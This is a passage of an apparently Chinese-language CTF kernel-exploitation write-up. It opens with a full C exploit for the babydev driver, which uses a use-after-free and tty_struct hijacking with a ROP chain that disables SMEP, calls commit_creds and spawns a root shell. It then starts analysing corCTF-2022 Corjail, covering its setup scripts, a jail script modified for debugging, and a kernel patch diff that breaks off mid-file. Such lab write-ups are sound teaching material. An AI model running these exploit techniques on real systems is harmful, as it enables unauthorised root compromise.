<h3 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xchg_eax_esp_addr           0xffffffff8100008a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_addr    0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_addr           0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_addr                0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_pop_rbp_addr         0xffffffff81063694          </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq_addr                  0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span>* (*prepare_kernel_cred)(<span class="type">void</span>*) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="type">void</span> (*commit_creds)(<span class="type">void</span>*) = commit_creds_addr;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_rflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> master_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="comment">// 交换rsp与rax低四位，且将高4位清零。</span></span><br><span class="line">    <span class="type">size_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        xchg_eax_esp_addr</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="comment">// fake_tty_ops是一个用户栈变量，保留低4位。</span></span><br><span class="line">    <span class="type">size_t</span> hijacked_stack_addr = ((<span class="type">size_t</span>)xchg_eax_esp_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">// 通过 tty_struct 执行 ioctl 时，rax 的值正好是 xchg_eax_esp_addr 指令的地址。</span></span><br><span class="line">    <span class="type">char</span>* fake_stack = mmap(</span><br><span class="line">            (hijacked_stack_addr &amp; (~<span class="number">0xffff</span>))<span class="number">-0x1000</span>, <span class="comment">// 对齐。</span></span><br><span class="line">            <span class="number">0x30000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE,                    </span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,</span><br><span class="line">            <span class="number">-1</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_stack, <span class="number">0</span>, <span class="number">0x30000</span>);</span><br><span class="line">    <span class="type">size_t</span> rop_chain_mem[] = &#123;</span><br><span class="line">        pop_rdi_addr, <span class="number">0x6f0</span>,</span><br><span class="line">        mov_cr4_rdi_pop_rbp_addr, <span class="number">0</span>, get_root,</span><br><span class="line">        swapgs_pop_rbp_addr, <span class="number">0</span>,</span><br><span class="line">        iretq_addr, get_shell, user_cs, user_rflags, user_rsp, user_ss</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(hijacked_stack_addr, rop_chain_mem, <span class="keyword">sizeof</span>(rop_chain_mem));</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">    *    struct tty_struct &#123;</span></span><br><span class="line"><span class="comment">    *        int  magic;                        : 4</span></span><br><span class="line"><span class="comment">    *        struct kref kref;  // atomic_t		: 4</span></span><br><span class="line"><span class="comment">    *        struct device *dev;				: 8</span></span><br><span class="line"><span class="comment">    *        struct tty_driver *driver;			: 8	</span></span><br><span class="line"><span class="comment">    *        const struct tty_operations *ops;	: 8</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    <span class="type">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line">    <span class="comment">// ops_ptr_addr -&gt; overwrite_mem+ops_ptr_offset -&gt; value</span></span><br><span class="line">    <span class="type">char</span>** ops_ptr_addr = overwrite_mem + ops_ptr_offset;</span><br><span class="line"></span><br><span class="line">    read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    <span class="comment">// value = &amp;fake_tty_ops</span></span><br><span class="line">    *ops_ptr_addr = &amp;fake_tty_ops;</span><br><span class="line">    <span class="comment">// change kernel ptmx ops_ptr</span></span><br><span class="line">    write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">	<span class="comment">// call fake_ops-&gt;ioctl to complete stack_pivot and exec our shellcode</span></span><br><span class="line">    ioctl(ptmx_fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="corCTF-2022-Corjail"><a href="#corCTF-2022-Corjail" class="headerlink" title="corCTF-2022 Corjail"></a>corCTF-2022 Corjail</h2><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>我们可以使用 <code>Guestfish</code> 工具读取和修改 <code>qcow2</code> 文件。</p>
<p><strong>run_challenge.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda quiet loglevel=3 rd.systemd.show_status=auto rd.udev.log_level=3 oops=panic panic=-1 net.ifnames=0 pti=on&quot;</span> \</span><br><span class="line">    -hda coros.qcow2 \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -cpu qemu64,+smep,+smap,+rdrand \</span><br><span class="line">    -smp cores=4 \</span><br><span class="line">    --enable-kvm</span><br></pre></td></tr></table></figure></div>

<p><strong>init脚本</strong></p>
<p>查看服务进程<code>/etc/systemd/system/init.service</code>；</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Description=Initialize challenge</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/usr/local/bin/init</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>

<p>查看 <code>/usr/local/bin/init</code> 脚本;</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">cat</span> /usr/local/bin/init</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">USER=user</span><br><span class="line"></span><br><span class="line">FLAG=$(<span class="built_in">head</span> -n 100 /dev/urandom | <span class="built_in">sha512sum</span> | awk <span class="string">&#x27;&#123;printf $1&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useradd --create-home --shell /bin/bash <span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PS1=&#x27;\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# &#x27;&quot;</span>  &gt;&gt; /root/.bashrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PS1=&#x27;\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;&quot;</span> &gt;&gt; /home/<span class="variable">$USER</span>/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> -r 0700 /home/<span class="variable">$USER</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> /root/temp /root/<span class="variable">$FLAG</span></span><br><span class="line"><span class="built_in">chmod</span> 0400 /root/<span class="variable">$FLAG</span></span><br></pre></td></tr></table></figure></div>

<p><strong>password</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ guestfish --rw -a coros.qcow2</span><br><span class="line">&gt;&lt;fs&gt; run</span><br><span class="line">&gt;&lt;fs&gt; list-filesystems</span><br><span class="line">/dev/sda: ext4</span><br><span class="line">&gt;&lt;fs&gt; mount /dev/sda /</span><br><span class="line">&gt;&lt;fs&gt; <span class="built_in">cat</span> /etc/password</span><br><span class="line">libguestfs: error: download: /etc/password: No such file or directory</span><br><span class="line">&gt;&lt;fs&gt; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/usr/local/bin/jail</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>

<p><strong>root_shell</strong></p>
<p>查看<code>root</code>用户的<code>/usr/local/bin/jail</code>;</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;fs&gt; <span class="built_in">cat</span> /usr/local/bin/jail</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;</span></span><br><span class="line"></span><br><span class="line">/usr/bin/docker run -it --user user \</span><br><span class="line">	--hostname CoRJail \</span><br><span class="line">    --security-opt seccomp=/etc/docker/corjail.json \</span><br><span class="line">    -v /proc/cormon:/proc_rw/cormon:rw corcontainer</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br><span class="line"></span><br><span class="line">/usr/sbin/poweroff -f</span><br></pre></td></tr></table></figure></div>

<p>发现其启动<code>root</code>的 <code>shell</code> 后是首先调用 <code>docker</code>来构建了一个容器然后关闭自身，在那之后我们起的虚拟环境就是处于该<code>docker</code>容器当中。</p>
<p>为了方便调试，我们可以使用<code>edit</code>将其修改为:</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;fs&gt; edit /usr/local/bin/jail </span><br><span class="line">&gt;&lt;fs&gt; <span class="built_in">cat</span> /usr/local/bin/jail</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /exploit /home/user || <span class="built_in">echo</span> <span class="string">&quot;[!] exploit not found, skipping&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R user:user /home/user</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">/usr/bin/docker run -it --user root \</span><br><span class="line">  --hostname CoRJail \</span><br><span class="line">  --security-opt seccomp=/etc/docker/corjail.json \</span><br><span class="line">  <span class="comment"># 允许容器能够调用与日志相关的系统调用</span></span><br><span class="line">  --cap-add CAP_SYSLOG \</span><br><span class="line">  <span class="comment"># 将宿主机的 /proc/cormon 目录挂载到容器内的 /proc_rw/cormon，并且以读写模式挂载。</span></span><br><span class="line">  -v /proc/cormon:/proc_rw/cormon:rw \</span><br><span class="line">  <span class="comment"># 将宿主机的 /home/user/ 目录挂载到容器内的 /home/user/host</span></span><br><span class="line">  -v /home/user/:/home/user/host \</span><br><span class="line">  corcontainer</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br><span class="line"></span><br><span class="line">/usr/sbin/poweroff -f</span><br></pre></td></tr></table></figure></div>

<p><code>edit</code> 的用法和 <code>vim</code> 一样。</p>
<p>后面我们上传 <code>exp</code> 的时候可以使用 <code>upload</code> 命令，其格式如下:</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;fs&gt; <span class="built_in">help</span> upload</span><br><span class="line">NAME</span><br><span class="line">    upload - upload a file from the <span class="built_in">local</span> machine</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">     upload filename remotefilename</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">    Upload <span class="built_in">local</span> file filename to remotefilename on the filesystem.</span><br><span class="line"></span><br><span class="line">    filename can also be a named pipe.</span><br><span class="line"></span><br><span class="line">    See also <span class="string">&quot;download&quot;</span>.</span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>kernel_patch</strong></p>
<div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c</span><br><span class="line"><span class="comment">--- a/arch/x86/entry/syscall_64.c	2022-06-29 08:59:54.000000000 +0200</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/entry/syscall_64.c	2022-07-02 12:34:11.237778657 +0200</span></span><br><span class="line"><span class="meta">@@ -17,6 +17,9 @@</span></span><br><span class="line"> </span><br><span class="line"> #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,</span><br><span class="line"> </span><br><span class="line"><span class="addition">+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);</span></span><br><span class="line"><span class="addition">+EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = &#123;</span><br><span class="line"> 	/*</span><br><span class="line"> 	 * Smells like a compiler bug -- it doesn&#x27;t work</span><br><span class="line">diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h</span><br><span class="line"><span class="comment">--- a/arch/x86/include/asm/syscall_wrapper.h	2022-06-29 08:59:54.000000000 +0200</span></span><br><span class="line"><span class="comment">+++ b/arch/x86/include/asm/syscall_wrapper.h	2022-07-02 12:34:11.237778657 +0200</span></span><br><span class="line"><span class="meta">@@ -245,7 +245,7 @@</span></span><br><span class="line">  * SYSCALL_DEFINEx() -- which is essential for the COND_SYSCALL() and SYS_NI()</span><br><span class="line">  * macros to work correctly.</span><br><span class="line">  */</span><br><span class="line"><span class="deletion">-#define SYSCALL_DEFINE0(sname)						\</span></span><br><span class="line"><span class="addition">+#define __SYSCALL_DEFINE0(sname)						\</span></span><br><span class="line"> 	SYSCALL_METADATA(_##sname, 0);					\</span><br><span class="line"> 	static long __do_sys_##sname(const struct pt_regs *__unused);	\</span><br><span class="line"> 	__X64_SYS_STUB0(sname)						\</span><br><span class="line">diff -ruN a/include/linux/syscalls.h b/include/linux/syscalls.h</span><br><span class="line"><span class="comment">--- a/include/linux/syscalls.h	2022-06-29 08:59:54.000000000 +0200</span></span><br><span class="line"><span class="comment">+++ b/include/linux/syscalls.h	2022-07-02 12:34:11.237778657 +0200</span></span><br><span class="line"><span class="meta">@@ -82,6 +82,7 @@</span></span><br><span class="line"> #include &lt;linux/key.h&gt;</span><br><span class="line"> #include &lt;linux/personality.h&gt;</span><br><span class="line"> #include &lt;trace/syscall.h&gt;</span><br><span class="line"><span class="addition">+#include &lt;asm/syscall.h&gt;</span></span><br><span class="line"> </span><br><span class="line"> #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER</span><br><span class="line"> /*</span><br><span class="line"><span class="meta">@@ -202,8 +203,8 @@</span></span><br><span class="line"> &#125;</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-#ifndef SYSCALL_DEFINE0</span></span><br><span class="line"><span class="deletion">-#define SYSCALL_DEFINE0(sname)					\</span></span><br><span class="line"><span class="addition">+#ifndef __SYSCALL_DEFINE0</span></span><br><span class="line"><span class="addition">+#define __SYSCALL_DEFINE0(sname)					\</span></span><br><span class="line"> 	SYSCALL_METADATA(_##sname, 0);				\</span><br><span class="line"> 	asmlinkage long sys_##sname(void);			\</span><br><span class="line"> 	ALLOW_ERROR_INJECTION(sys_##sname, ERRNO);		\</span><br><span class="line"><span class="meta">@@ -219,9 +220,41 @@</span></span><br><span class="line"> </span><br><span class="line"> #define SYSCALL_DEFINE_MAXARGS	6</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-#define SYSCALL_DEFINEx(x, sname, ...)				\</span></span><br><span class="line"><span class="deletion">-	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\</span></span><br><span class="line"><span class="deletion">-	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)</span></span><br><span class="line"><span class="addition">+DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \</span></span><br><span class="line"><span class="addition">+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define __SYSCALL_COUNT(syscall_nr) \</span></span><br><span class="line"><span class="addition">+	this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_COUNT_FUNCx(sname, x, ...)					\</span></span><br><span class="line"><span class="addition">+	&#123;									\</span></span><br><span class="line"><span class="addition">+		__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);		\</span></span><br><span class="line"><span class="addition">+		return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));	\</span></span><br><span class="line"><span class="addition">+	&#125;									\</span></span><br><span class="line"><span class="addition">+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_COUNT_DECLARE0(sname) \</span></span><br><span class="line"><span class="addition">+	static inline long __count_sys_##sname(void);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_COUNT_FUNC0(sname)					\</span></span><br><span class="line"><span class="addition">+	&#123;								\</span></span><br><span class="line"><span class="addition">+		__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);	\</span></span><br><span class="line"><span class="addition">+		return __count_sys_##sname();				\</span></span><br><span class="line"><span class="addition">+	&#125;								\</span></span><br><span class="line"><span class="addition">+	static inline long __count_sys_##sname(void)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_DEFINEx(x, sname, ...)			\</span></span><br><span class="line"><span class="addition">+	SYSCALL_METADATA(sname, x, __VA_ARGS__)		\</span></span><br><span class="line"><span class="addition">+	SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)	\</span></span><br><span class="line"><span class="addition">+	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)	\</span></span><br><span class="line"><span class="addition">+	SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#define SYSCALL_DEFINE0(sname)		\</span></span><br><span class="line"><span class="addition">+	SYSCALL_COUNT_DECLARE0(sname)	\</span></span><br><span class="line"><span class="addition">+	__SYSCALL_DEFINE0(sname)	\</span></span><br><span class="line"><span class="addition">+	SYSCALL_COUNT_FUNC0(sname)</span></span><br><span class="line"> </span><br><span class="line"> #define __PROTECT(...) asmlinkage_protect(__VA_ARGS__)</span><br><span class="line"> </span><br><span class="line">diff -ruN a/kernel/trace/trace_syscalls.c b/kernel/trace/trace_syscalls.c</span><br><span class="line"><span 